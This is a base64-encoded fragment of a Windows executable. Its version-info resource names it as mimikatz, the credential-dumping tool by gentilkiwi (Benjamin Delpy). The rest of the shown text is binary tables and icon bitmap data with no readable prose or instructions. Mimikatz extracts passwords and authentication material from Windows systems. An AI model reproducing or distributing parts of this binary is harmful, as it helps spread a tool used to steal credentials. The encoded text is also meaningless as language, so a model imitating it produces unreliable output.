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G8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAKABjACkAIAAyADAAMAA3ACAALQAgADIAMAAxADQAIABnAGUAbgB0AGkAbABrAGkAdwBpACAAKABCAGUAbgBqAGEAbQBpAG4AIABEAEUATABQAFkAKQAAAEIADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAAAAAAWgAdAAEAUAByAGkAdgBhAHQAZQBCAHUAaQBsAGQAAABCAHUAaQBsAGQAIAB3AGkAdABoACAAbABvAHYAZQAgAGYAbwByACAAUABPAEMAIABvAG4AbAB5AAAAAAA8AA4AAQBTAHAAZQBjAGkAYQBsAEIAdQBpAGwAZAAAAGsAaQB3AGkAIABmAGwAYQB2AG8AcgAgACEAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAACQSwBCgAAAAwAAAAYAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVP2IACgUBAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwAWQmcACgYDAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwAJAwAACwoJAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsCCwsLBAsLCwkLCwsOCwsLEwsLCxcLCwsaCwsLFwsLCxMLCwsNCwsLBQsLCwILCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCgkACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsHCwsLFgsLCycLCws4CwkJPwsJB0ULCQdNCwkHWQsJB2QLCQlwCwsJewsLC4ULCwyKCwsMiQsLC38LCwtzCwsLZQsLC1YLCwtJCwsLQAsLCzoLCwsuCwsLHAsLCwoLCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsNCwsLHgsLCzYLCwtOCwsLZgsJBXMNCQaHDQ0Nnw0NEa4OExe+DQ4RvAkMDr4LCwvGDQsIzAsHA8oLCAPRCwgF1AsJB9MLCwnNCwsLxAsLDLsLCwuxCwsLqAsLC5wLCwuKCwsLbAsLC0oLCwspCwsLEQsLCwMLCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLBgsLCyQLCwtECwsLYgsKCX0LCQaPDQgGqA0SGdAKGiz4CR41/wcgO/8HI0P/CCZF/wklQ/8JIDv/CCA5/wogN/4LGSj9CxYg+QsNEvULCQXzCwYD8gsJBfALCQnqCwsL5QsLC9oLCwvJCwsLrQsLC40LCwtoCwsLRAsLCyYLCwsSCwsLBgsLCwELCwsACwsLAAsLCwAMDAwADAwMAAwMDAAMDAwADAwMAAwMDAALCwwACwwMAAwMDAAMDAwADAwMEwsLDDkJCQlgCggDfAwKCKUMERfbCh40/wckQv8GIT3/Bh44/wkoRf8JJkL/CSxN/wkpR/8JKUb/CShE/wclQ/8IKEj/CClK/wgmQv8IHTP/Chwt/wsSGf4LCwn6CwcE8gsJBeYLCgnfCwsLzQsLC7ILCwuLCwsLagsLC0YLCwspCwsLEwsLCwYLCwsACwsLAAsLCwAIB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